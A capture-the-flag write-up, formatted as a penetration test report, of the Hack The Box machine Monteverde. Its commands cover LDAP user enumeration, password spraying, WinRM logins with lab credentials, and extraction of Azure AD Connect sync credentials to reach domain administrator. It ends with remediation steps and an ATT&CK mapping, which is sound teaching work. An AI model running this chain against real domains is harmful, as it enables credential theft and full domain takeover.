# Penetration Test Report — Monteverde

![Difficulty](https://img.shields.io/badge/difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-password%20spray%20%2F%20Azure%20AD%20Connect-red)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `MEGABANK.LOCAL`) enumerated domain users via anonymous LDAP binds and — with no account lockout policy — password-sprayed its way to the `SABatchJobs` service account (password identical to username). A world-readable `users$` share exposed an **Azure AD credential XML** whose password was reused by `mhope` for WinRM. Because **Azure AD Connect** was installed with a custom SQL Server backend, the AD Connect sync-account credentials — in this case the **domain Administrator's** — were extracted from the sync database, resulting in full domain compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Anonymous LDAP binds enabled | Medium |
| 2 | No account lockout threshold + username-as-password (`SABatchJobs`) | High |
| 3 | World-readable `users$` share containing Azure credential XML | High |
| 4 | Password reuse (Azure AD ↔ on-prem AD, `mhope`) | High |
| 5 | Azure AD Connect using the domain Administrator as the sync account | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
python windapsearch.py -u "" --dc-ip target.htb -U --admin-objects
```

Anonymous LDAP bind succeeded. Users included `SABatchJobs`, `mhope` (Remote Management Users), and **`AAD_987d7f2f57d2`** — a strong indicator that **Azure AD Connect** synchronizes this domain. enum4linux confirmed **no account lockout threshold**.

### 2. Foothold — Password Spray

```bash
python windapsearch.py -u "" --dc-ip target.htb -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
cat users.txt >> english-basic.txt   # usernames appended — username-as-password is common

crackmapexec smb target.htb -d megabank -u users.txt -p english-basic.txt
# [+] megabank\SABatchJobs:SABatchJobs
```

### 3. Lateral Movement — azure.xml & Password Reuse

```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H target.htb -A '(xlsx|docx|txt|xml)' -R
```

The `users$` share yielded `mhope\azure.xml` — a serialized `PSADPasswordCredential` containing `4n0therD4y@n0th3r$`. Reused against on-prem AD over WinRM:

```bash
evil-winrm -i target.htb -u mhope -p '4n0therD4y@n0th3r$'
```

User flag: `C:\Users\mhope\Desktop`. `whoami /groups` → **MEGABANK\Azure Admins**.

### 4. Privilege Escalation — Azure AD Connect Credential Extraction

`C:\Program Files` showed SQL Server + Azure AD Sync (custom install). Service enumeration was blocked, but the registry revealed the binary:

```powershell
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-List -Property * -Force
```

The legacy AD Connect build stores encrypted sync credentials in the `ADSync` database, decryptable with `mcrypt.dll` given `instance_id`, `keyset_id`, and `entropy`. Since this was a custom SQL Server install (not LocalDB), values were pulled with `sqlcmd`:

```powershell
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```

The public ADConnect extraction PoC was adapted (hardcoded keys, custom SQL Server target) and run in-memory via Evil-WinRM:

```powershell
evil-winrm -i target.htb -u mhope -p "4n0therD4y@n0th3r$" -s .
adconnect.ps1        # Get-ADConnectPassword
# Domain: MEGABANK | Username: Administrator | Password: d0m@in4dminyeah!
```

Because the custom install used the **primary domain administrator** as the sync account:

```bash
evil-winrm -i target.htb -u administrator -p 'd0m@in4dminyeah!'
```

Root flag: `C:\Users\Administrator\Desktop`.

## Remediation

- Disable anonymous LDAP binds; enable account lockout and ban username-as-password via password policy.
- Remove world-read on `users$`; scan shares for credential artifacts (`.xml`, `.ps1`, configs).
- Prohibit cross-directory password reuse (Azure ↔ on-prem); enable Entra password protection.
- AD Connect sync must use the default low-privilege account — never a Domain Admin; rotate exposed credentials and monitor ADSync database access.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1110.003 — Password Spraying |
| Credential Access | T1552.001 — Credentials in Files (azure.xml) |
| Credential Access | T1555 — Credentials from Password Stores (AD Connect DB) |
| Privilege Escalation | T1078 — Valid Accounts (sync account = DA) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
